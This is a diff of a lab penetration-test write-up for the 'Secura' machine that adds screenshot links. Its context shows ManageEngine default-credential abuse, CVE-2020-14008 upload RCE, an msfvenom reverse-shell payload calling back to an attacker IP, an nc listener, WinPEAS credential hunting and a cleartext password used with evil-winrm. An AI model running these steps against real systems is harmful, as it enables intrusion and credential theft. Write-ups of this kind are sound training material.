@@ -54,6 +54,10 @@ This host was confirmed as the **Domain Controller** for the `secura.yzx` domain
 
 ### 3.4 Evidence — Full Scan Output
 
+![](/assets/img/posts/secura/recon-1.png)
+![](/assets/img/posts/secura/recon-2.png)
+![](/assets/img/posts/secura/recon-3.png)
+
 ---
 
 ## 4.0 Enumeration — ManageEngine Applications Manager
@@ -62,9 +66,17 @@ This host was confirmed as the **Domain Controller** for the `secura.yzx` domain
 
 Browsing to `https://192.168.216.95:8443` presented a ManageEngine Applications Manager 14 login portal. The application was found to still be configured with the **default administrative credentials `admin:admin`**, indicating the deployment had not been hardened.
 
+![](/assets/img/posts/secura/manageengine-login.png)
+
 ### 4.2 Unrestricted File Upload (CVE-2020-14008)
 
 Once authenticated to the application, an enumeration of its functionality revealed a **file upload** feature. Testing demonstrated that the feature accepted **arbitrary file extensions** and wrote uploaded files into the directory `C:\Program Files\ManageEngine\AppManager14\working\`. Files placed in this directory are **executed by the server**, providing a direct path to remote code execution. This weakness corresponds to **CVE-2020-14008**, an arbitrary file-upload/remote code execution vulnerability in ManageEngine.
+
+![](/assets/img/posts/secura/manageengine-upload.png)
+
+![](/assets/img/posts/secura/manageengine-enum.png)
+
+![](/assets/img/posts/secura/manageengine-rce.png)
 
 ---
 
@@ -78,17 +90,23 @@ A Windows x64 reverse-shell payload was generated on the attacker machine using 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=1234 -f exe -o 1.exe
 ```
 
+![](/assets/img/posts/secura/msfvenom.png)
+
 A batch launcher `run.bat` was then created to execute the payload once triggered:
 
 ```bat
 start "" "C:\Program Files\ManageEngine\AppManager14\working\1.exe"
 ```
 
+![](/assets/img/posts/secura/run-bat.png)
+
 Both `1.exe` and `run.bat` were uploaded through the ManageEngine upload feature, and `run.bat` was triggered from within the application. A Netcat listener was started on the attacker machine:
 
 ```bash
 nc -lvnp 1234
 ```
+
+![](/assets/img/posts/secura/nc-listener.png)
 
 The listener received a reverse connection, yielding a command shell on `192.168.216.95` running as **`NT AUTHORITY\SYSTEM`** — full local administrative control of VM3 without further privilege escalation.
 
@@ -112,6 +130,8 @@ It was uploaded to the target using Evil-WinRM's `upload` command:
 upload /home/kali/tools/winPEASx64.exe
 ```
 
+![](/assets/img/posts/secura/winpeas-upload.png)
+
 and executed using the `windowscreds` focused mode (credential checks only, `quiet` suppresses the banner), redirecting the output to a file:
 
 ```powershell
@@ -123,6 +143,8 @@ The report was downloaded back to the attacker machine for analysis:
 ```powershell
 download winpeas.txt
 ```
+
+![](/assets/img/posts/secura/winpeas-download.jpg)
 
 The WinPEAS output was analysed and produced the following notable findings:
 
@@ -137,6 +159,8 @@ The WinPEAS output was analysed and produced the following notable findings:
 ### 6.1 RDCMan Stored Credentials (lead)
 
 WinPEAS identified an RDCMan settings file in the Administrator profile. RDCMan stores RDP connection credentials, and the file was flagged as a lead to stored credentials. Reading the file is the next step to recover credentials for lateral movement.
+
+![](/assets/img/posts/secura/winpeas-rdcman.png)
 
 Reading the file revealed a **cleartext credential** stored in an RDCMan credentials profile:
 
@@ -173,6 +197,8 @@ evil-winrm -i 192.168.216.96 -u apache -p 'New2Era4.!'
 ```
 
 A shell was obtained as the local userc **`era\apache`** (SID `S-1-5-21-1316868832-3073753287-3359562679-1003`, RID 1003 — a low-privileged local account).
+
+![](/assets/img/posts/secura/apache-shell.jpg)
 
 ---
 
@@ -356,3 +382,5 @@ Key findings:
 
 - **local.txt:**
 - **proof.txt:**
+
+---
